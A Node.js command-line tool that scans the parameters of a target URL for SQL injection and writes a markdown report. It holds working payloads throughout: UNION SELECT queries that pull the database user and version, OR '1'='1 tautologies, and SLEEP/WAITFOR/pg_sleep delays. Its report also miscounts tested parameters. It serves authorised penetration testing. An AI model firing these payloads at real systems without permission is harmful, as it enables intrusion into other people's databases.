/**
 * SQL Injection Tester
 * Tests for various SQL injection vulnerabilities.
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');
const { promisify } = require('util');
const fs = require('fs');

class SQLInjectionTester {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.vulnerableParams = [];
    }

    async makeRequest(url) {
        return new Promise((resolve, reject) => {
            const urlObj = new URL(url);
            const protocol = urlObj.protocol === 'https:' ? https : http;

            const options = {
                hostname: urlObj.hostname,
                port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
                path: urlObj.pathname + urlObj.search,
                method: 'GET',
                timeout: 5000
            };

            const req = protocol.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        text: data.toLowerCase()
                    });
                });
            });

            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Timeout'));
            });

            req.end();
        });
    }

    async testUnionBased(param, value) {
        const payloads = [
            `${value}' UNION SELECT NULL--`,
            `${value}' UNION SELECT NULL,NULL--`,
            `${value}' UNION SELECT NULL,NULL,NULL--`,
            `${value}' UNION SELECT 1,2,3--`,
            `${value}' UNION SELECT user(),database(),version()--`
        ];

        for (const payload of payloads) {
            try {
                const testUrl = `${this.targetUrl}?${param}=${encodeURIComponent(payload)}`;
                const response = await this.makeRequest(testUrl);

                const indicators = ['mysql', 'sql syntax', 'union', 'database', 'version()'];
                if (indicators.some(indicator => response.text.includes(indicator))) {
                    console.log(`[+] Potential UNION-based SQLi in parameter: ${param}`);
                    console.log(`    Payload: ${payload}`);
                    return true;
                }
            } catch (error) {
                // Continue to next payload
            }
        }

        return false;
    }

    async testErrorBased(param, value) {
        const payloads = [
            `${value}'`,
            `${value}"`,
            `${value}' OR '1'='1`,
            `${value}' AND 1=1--`,
            `${value}' AND 1=2--`,
            `${value}' UNION SELECT NULL,CONCAT(@@version),NULL--`
        ];

        const sqlErrors = [
            'sql syntax',
            'mysql_fetch',
            'mysql_num_rows',
            'mysql_query',
            'postgresql',
            'ora-',
            'microsoft ole db',
            'sqlite',
            'sql server',
            'odbc',
            'jdbc'
        ];

        for (const payload of payloads) {
            try {
                const testUrl = `${this.targetUrl}?${param}=${encodeURIComponent(payload)}`;
                const response = await this.makeRequest(testUrl);

                for (const error of sqlErrors) {
                    if (response.text.includes(error)) {
                        console.log(`[+] Potential error-based SQLi in parameter: ${param}`);
                        console.log(`    Payload: ${payload}`);
                        console.log(`    Error detected: ${error}`);
                        return true;
                    }
                }
            } catch (error) {
                // Continue to next payload
            }
        }

        return false;
    }

    async testBlindBoolean(param, value) {
        const truePayload = `${value}' AND 1=1--`;
        const falsePayload = `${value}' AND 1=2--`;

        try {
            const trueUrl = `${this.targetUrl}?${param}=${encodeURIComponent(truePayload)}`;
            const falseUrl = `${this.targetUrl}?${param}=${encodeURIComponent(falsePayload)}`;

            const trueResponse = await this.makeRequest(trueUrl);
            const falseResponse = await this.makeRequest(falseUrl);

            if (trueResponse.text.length !== falseResponse.text.length) {
                console.log(`[+] Potential blind boolean-based SQLi in parameter: ${param}`);
                console.log(`    Response length difference detected`);
                return true;
            }
        } catch (error) {
            // Error occurred
        }

        return false;
    }

    async testTimeBased(param, value) {
        const payloads = [
            `${value}' AND SLEEP(5)--`,
            `${value}' AND WAITFOR DELAY '00:00:05'--`,
            `${value}' AND pg_sleep(5)--`
        ];

        for (const payload of payloads) {
            try {
                const testUrl = `${this.targetUrl}?${param}=${encodeURIComponent(payload)}`;
                const startTime = Date.now();
                await this.makeRequest(testUrl);
                const elapsedTime = (Date.now() - startTime) / 1000;

                if (elapsedTime >= 4) {
                    console.log(`[+] Potential time-based blind SQLi in parameter: ${param}`);
                    console.log(`    Payload: ${payload}`);
                    console.log(`    Response time: ${elapsedTime.toFixed(2)} seconds`);
                    return true;
                }
            } catch (error) {
                // Continue to next payload
            }
        }

        return false;
    }

    async testParameter(param, value = '1') {
        const results = {
            parameter: param,
            union_based: false,
            error_based: false,
            blind_boolean: false,
            time_based: false,
            vulnerable: false
        };

        console.log(`\n[*] Testing parameter: ${param}`);

        results.union_based = await this.testUnionBased(param, value);
        results.error_based = await this.testErrorBased(param, value);
        results.blind_boolean = await this.testBlindBoolean(param, value);
        results.time_based = await this.testTimeBased(param, value);

        results.vulnerable = results.union_based || results.error_based || 
                           results.blind_boolean || results.time_based;

        if (results.vulnerable) {
            this.vulnerableParams.push(results);
        }

        return results;
    }

    async testAll(params) {
        const results = [];
        for (const param of params) {
            const result = await this.testParameter(param);
            results.push(result);
        }
        return results;
    }

    generateReport() {
        let report = `# SQL Injection Test Report\n\n`;
        report += `**Target**: ${this.targetUrl}\n\n`;
        report += `## Summary\n\n`;
        report += `Total Parameters Tested: ${this.vulnerableParams.length}\n`;
        report += `Vulnerable Parameters: ${this.vulnerableParams.filter(p => p.vulnerable).length}\n\n`;

        report += `## Vulnerable Parameters\n\n`;
        this.vulnerableParams.forEach(vuln => {
            if (vuln.vulnerable) {
                report += `### ${vuln.parameter}\n\n`;
                report += `- Union-based: ${vuln.union_based ? 'Yes' : 'No'}\n`;
                report += `- Error-based: ${vuln.error_based ? 'Yes' : 'No'}\n`;
                report += `- Blind Boolean: ${vuln.blind_boolean ? 'Yes' : 'No'}\n`;
                report += `- Time-based: ${vuln.time_based ? 'Yes' : 'No'}\n\n`;
            }
        });

        return report;
    }
}

async function main() {
    const args = process.argv.slice(2);
    if (args.length < 1) {
        console.log('Usage: node sql_injection_tester.js <target_url> [param1] [param2] ...');
        console.log('Example: node sql_injection_tester.js http://example.com/page.php id user');
        process.exit(1);
    }

    const targetUrl = args[0];
    const params = args.slice(1).length > 0 ? args.slice(1) : ['id', 'user', 'page'];

    const tester = new SQLInjectionTester(targetUrl);

    console.log(`[*] Testing SQL injection on: ${targetUrl}`);
    console.log(`[*] Parameters to test: ${params.join(', ')}\n`);

    await tester.testAll(params);

    const report = tester.generateReport();
    fs.writeFileSync('sql_injection_report.md', report, 'utf8');

    console.log(`\n[+] Report saved to sql_injection_report.md`);
    console.log(`[!] WARNING: Only test on systems you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = SQLInjectionTester;

